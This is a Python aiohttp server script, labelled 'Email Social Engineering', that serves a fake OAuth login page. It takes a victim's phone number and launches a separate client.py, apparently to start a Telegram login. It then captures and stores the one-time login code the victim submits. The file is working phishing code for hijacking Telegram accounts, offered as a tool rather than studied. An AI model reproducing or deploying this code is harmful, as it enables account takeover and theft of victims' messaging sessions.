__author__      = "rewiaca"
__copyright__   = "Copyright 2020, Email Social Engineering"
__credits__ = ["rewiaca", "", "",]
__license__ = "GPL"
__version__ = "1.0"
__maintainer__ = "rewiaca"
__status__ = "Dev"

import os, asyncio, subprocess, shlex, time, pytz, datetime, traceback
from aiohttp import web
from database import collection
from wlog import wlog


async def root(request):
    
    f = open('templates/oauth/index.html', 'r') 
    template = f.read()
    f.close()

    return web.Response(text=template, content_type='text/html')
    
    
async def post(request):
    
    response = ''
    code = False
    phone = False
    
    try:
        data = await request.post()
        phone = data.get('phone')
        code = data.get('code')
    except Exception as e:
        pass
        
    if code and phone:
    
        wlog('WEB: Sent code: '+code+' for phone: '+phone)
    
        try:
            document_code = {'datetime': datetime.datetime.now(), 'code': code, 'used': 0}
            if await collection.count_documents({"phone": phone}) == 0:
                document = {'phone': phone}
                document['codes'] = [document_code]
                await collection.insert_one(document)
            else:
                item = await collection.find_one({'phone': phone})
                await collection.update_one({"_id": item['_id']}, {'$push': {"codes": document_code}})
                
        except Exception as e:
            wlog(traceback.print_exc())
            
        response += 'Code ' + code +' saved'
        
        return web.Response(text=response, content_type='text/html')
            
    elif phone and not code:
        
        wlog('WEB: Sent phone: '+phone)

        cmd = ["python3", "client.py", phone]
        process = subprocess.Popen(cmd, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        wlog('AUTH: Started Telegram Client with command: ' + str(cmd) + ' and waiting for code')
        
        result = process.communicate()[0].decode()
        
        wlog('AUTH: Got response from client')
        wlog(result, date=False)
            
        return web.Response(text=result, content_type='text/html')


routes = web.RouteTableDef()
app = web.Application()

app.add_routes([web.get('/', root),
                web.post('/post', post),
                ])


if __name__ == '__main__':
    
    import argparse

    parser = argparse.ArgumentParser(description="aiohttp server")
    parser.add_argument('--path')
    parser.add_argument('--port')
    parser.add_argument('--host')
    
    args = parser.parse_args()
    web.run_app(app, path=args.path, host=args.host, port=args.port)
        
    
    #web.run_app(app, host='localhost', port='80')
